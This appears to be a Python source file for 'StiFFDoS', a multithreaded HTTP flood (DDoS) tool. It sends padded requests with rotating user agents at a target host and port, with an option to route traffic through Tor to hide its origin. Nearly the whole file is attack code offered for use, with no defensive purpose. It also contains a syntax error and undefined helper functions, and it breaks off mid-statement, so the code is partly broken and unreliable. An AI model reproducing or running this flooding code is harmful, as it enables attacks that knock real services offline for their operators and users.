import socket
import random
import time
import threading
import sys
import cfscrape
import itertools
import argparse
import os
from datetime import timedelta
from base64 import *

start = time.time()
try:
	import socks 
	havetor = True
except ModuleNotFoundError:
	print("[!] PySocks Not Installed, Tor Option Not Available")
	havetor = False



 
def humansize(num, suffix='B'):
    for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
        if abs(num) < 1024.0:
            return "%3.1f%s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)

class color:
	NOCOLOR='\033[0m'
	RED='\033[0;31m'
	GREEN='\033[0;32m'
	ORANGE='\033[0;33m'
	BLUE='\033[0;34m'
	PURPLE='\033[0;35m'
	CYAN='\033[0;36m'
	LIGHTGRAY='\033[0;37m'
	DARKGRAY='\033[1;30m'
	LIGHTRED='\033[1;31m'
	LIGHTGREEN='\033[1;32m'
	YELLOW='\033[1;33m'
	LIGHTBLUE='\033[1;34m'
	LIGHTPURPLE='\033[1;35m'
	LIGHTCYAN='\033[1;36m'
	WHITE='\033[1;37m'



sig = b64decode
def uagent():
	userAgent = []
	add = userAgent.append
	add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134")
	add("Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
	add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134")
	add("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36")
	add("Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
	add("Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0")
	add("Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1")
	add("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2")
	add("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0")
	add("Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0")
	add("Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
	add("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27"/
	add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2")
	add("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
	add("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3")
	add("Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0")
	add("Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)")
	add("Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9")
	add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8")
	add("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5","Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8")
	add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a","Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2","Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0","Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34")
	add("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1")
	add("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2")
	add("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1","Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1")
	add("Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ")
	add("Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
	add("Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre")
	add("Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0")
	add("Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2","Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0","Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24")
	add("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1")
	add("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
	add("Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre")
	add("Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1")
	add("Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2")
	add("Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
	add("Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre")
	add("Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0")
	add("Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1")
	add("Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0")
	add("Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8")
	add("Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0")
	add("Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15")
	add("Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko")
	add("Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16")
	add("Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025")
	add("Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1")
	add("Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020")
	add("Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1")
	add("Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)")
	add("Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8")
	add("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7")
	add("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8")
	add("Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2")
	add("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330")
	add("Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)")
	add("Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8")
	add("Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0")
	add("Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9")
	add("Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12")
	add("Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0")
	add("Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15")
	add("Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0")
	add("Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3")
	add("Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5")
	add("Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8")
	add("Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3")
	add("Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15")
	add("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN","Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN")
	add("Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
	add("Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
	add("Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN")
	add("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN")
	add("Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN")
	add("Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN")
	add("Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN")
	return random.choice(userAgent)
import signal

def keyboardInterruptHandler(signal, frame):
    print("KeyboardInterrupt (ID: {}) has been caught. Cleaning up...".format(signal))
    exit(0)

def create_useragents(thread):
	for _ in range(thread):
		useragents.append(getuseragent())

def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os  = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(Intn(2020, currentYear))
        month = Intn(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = Intn(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(Intn(1, 99)) + '.0'
        engine = str(Intn(1, 99)) + '.0'
        option = Choice([True, False])
        if option == True:
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'


def createData(url,metode):
	data = f'{metode} / HTTP/1.1\r\nHost: {url}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: {uagent()}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\ndnt: 1\r\nX-Requested-With: curl\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nReferer: http://{url}/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n'+str(os.urandom(random.randint(1,8192)))
	return data.encode()


ld = 10
anim = "|/—\\".replace(""," ").split()
failed = []
working = []


def dosBot(url,port,i,tunda,metode):
	global ts 
	ts = 0
	global size
	size = 0
	for anime in itertools.cycle(anim):
		resdata = createData(url,metode)
		bps = humansize(sys.getsizeof(resdata*4))
		sizeData = sys.getsizeof(resdata)
		if bps == 0:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{bps} B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		else:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{bps} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		time.sleep(0.1)
		sys.stdout.flush()
		
		try:
			t0 = time.time()
			sock = socket.socket()
			sock.connect((url,port))
			lenData = len(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.shutdown(1)
			ts = time.time() - t0
			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE} Server Up"+"                       "*5)
			working.append(i)
			size = size + sizeData*4
		except KeyboardInterrupt:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
			sys.exit(1)
		except socket.error:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Cannot Be Reached! cause: Maybe Target Down, No Connection,{color.WHITE}"+"       "*4)
			failed.append(i)
			size = size + sizeData*4
		


def torBot(url,port,i,torrip,torport,tunda,metode):
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(torrip), int(torport), True)

	global ts 
	ts = 0
	global size
	size = 0
	global statusSend
	for anime in itertools.cycle(anim):
		resdata = createData(url,metode)
		bps = sys.getsizeof(resdata*4)
		sizeData = sys.getsizeof(createData(url,metode))
		if bps == 0:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.PURPLE}Tor{color.GREEN} -->{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{humansize(bps)}   B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		else:
			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.PURPLE}Tor{color.GREEN} -->{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE} : {len(working)} | ✓ {humansize(size)} tx:{humansize(bps)} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
		sys.stdout.flush()
		time.sleep(0.1)
		#sizeData = sys.getsizeof(createData(url,metode))
		
		try:
			t0 = time.time()
			sock = socks.socksocket()
			sock.connect((url,port))
			lenData = len(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.sendto(resdata,(url,port))
			sock.send(resdata)
			sock.shutdown(1)
			ts = time.time() - t0
			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE} Server Up"+"                       "*5)
			working.append(i)
			size = size + sizeData*4
			time.sleep(tunda)
		except KeyboardInterrupt:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
			sys.exit(1)
		except socket.error:
			print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}No Connection ! Server May Be Down {color.WHITE}"+"       "*4)
			failed.append(i)
			size = size + sizeData*4
			
	





def run(url,port,thread,tunda,metode):
	for i in range(thread):
		print(f"[Info] Starting All Thread                                    ")
		t = threading.Thread(target=dosBot,args=(url,port,i,tunda,metode))
		t.start()


def runTor(url,port,thread,toraddr,torport,tunda,metode):
	for i in range(thread):
		print(f"[Info] Starting All Thread                                    ")
		t = threading.Thread(target=torBot,args=(url,port,i,toraddr,torport,tunda,metode))
		t.start()
		moduleLoaded = True
		
args = sys.argv

print(" ")
print ('''
   ***
  ** **
 **   **
 **   **         ****
 **   **       **   ****
 **  **       *   **   **
  **  *      *  **  ***  **
   **  *    *  **     **  *
    ** **  ** **        **
    **   **  **
   *           *
  *             *
 *    0     0    *
 *   /   @   \   *
 *   \__/ \__/   *
   *     W     *
     **     **
       ***** StiFFDoS

+-------------------------+
| I Suggest Strength 2000 |
+-------------------------+ ''')



parser = argparse.ArgumentParser(description="Python Tor Network Supported Ddos")
parser.add_argument ("-s","--target", help= "Target IP Address", type=str, dest='target', required=True )
parser.add_argument ("-p","--port", help= "Port Of Target", type=str, dest='port', required=False,default=80)
parser.add_argument ("-m","--method", help= "HTTP Method", type=str, dest='method', required=False ,default="POST")
parser.add_argument ("-t","--thread", help= "Threading", type=int, dest='thread', required=False ,default=50)
print(" ")

if havetor == True:
	parser.add_argument ("-o","--onion", help= "Attack Over Tor Network (Socks5), 127.0.0.1:9050", metavar="<host[:port]>",type=str, dest='tor', required=False)
args = parser.parse_args()
target = args.target.replace("https://","").replace("http://","")
s = cfscrape.create_scraper()
thread = args.thread
port = args.port
sleep = 0.1
method = args.method.upper()

if method not in ["GET","HEAD","POST","PUT","DELETE","CONNECT","OPTIONS","TRACE","PATH"]:
